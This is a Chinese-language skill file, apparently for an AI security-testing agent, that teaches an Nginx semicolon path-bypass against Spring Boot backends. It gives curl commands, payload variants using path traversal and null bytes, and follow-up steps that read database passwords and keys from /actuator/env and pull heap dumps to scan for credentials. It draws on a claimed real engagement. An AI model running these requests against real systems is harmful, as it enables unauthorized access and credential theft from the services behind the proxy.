---
name: nginx-semicolon-bypass
description: >-
  Nginx 分号路径旁路：利用 Nginx $uri 在分号处截断而 Spring/Tomcat
  忽略分号继续路由的差异，绕过 Nginx location 关键词拦截。
  适用于 Nginx 反代 + Spring Boot 且 Nginx 精确匹配拦 actuator/admin 等路径。
  用户提到 nginx 绕过、分号旁路、actuator 被拦、path normalization 时使用。
  来源：a2c_20260813 实战提炼。
version: 1.0.0
---

# Nginx 分号路径旁路

**前提**：目标在 `config/scope*.json`。
**来源**：案卷 `a2c_20260813` §25 实战验证。

---

## 原理

Nginx 处理 `$uri` 时在 `;` 处截断（RFC 3986 path parameters）：
```
请求: /api/talk;x/actuator/env
Nginx $uri → /api/talk        ← 匹配到 /api/talk，放行
Spring    → /api/talk/actuator/env  ← 忽略 ;x，路由到 actuator
```

## 快速检测

```bash
# 正常路径被拦（403/404/WAF）
curl -s "https://目标/api/actuator/env" -o /dev/null -w "%{http_code}"
# → 403

# 分号旁路
curl -s "https://目标/api/talk;x/actuator/env" -o /dev/null -w "%{http_code}"
# → 200 ← 命中！
```

## 变体矩阵

| 变体 | 说明 |
|------|------|
| `/api/talk;x/actuator/env` | 基础型（x 可任意） |
| `/api/talk;../actuator/env` | 结合路径穿越 |
| `/api/talk;%00/actuator/env` | 空字节 |
| `/api/user;foo/actuator/heapdump` | 换前缀 |

## 适用条件

- ✅ Nginx 用 `location` + `$uri` 匹配（最常见）
- ✅ 后端是 Spring Boot / Tomcat（忽略 path parameters）
- ❌ Nginx 用 `$request_uri`（未解码，分号不截断）
- ❌ 后端是 Go/Node（不处理 path parameters）
- ❌ WAF 在 Nginx 前面（如 Cloudflare）拦截了 `;`

## 实战组合

命中后继续打：
1. `/actuator/env` → 读配置（数据库密码、密钥）
2. `/actuator/heapdump` → 堆转储（立刻 `heap_cred_scan.py`）
3. `/actuator/gateway/routes` → Spring Gateway 路由表
4. `/actuator/refresh` → 动态刷新配置

## 踩坑记录

- a2c 案中 `heapdump` 被 Nginx 单独拦截（即使分号也拦），但 `env`/`health`/`dubbo` 可以
- 需要逐个 actuator 端点测试，不是一把钥开所有门
- 对方可能更新 Nginx 配置关闭此路径，需持续验证
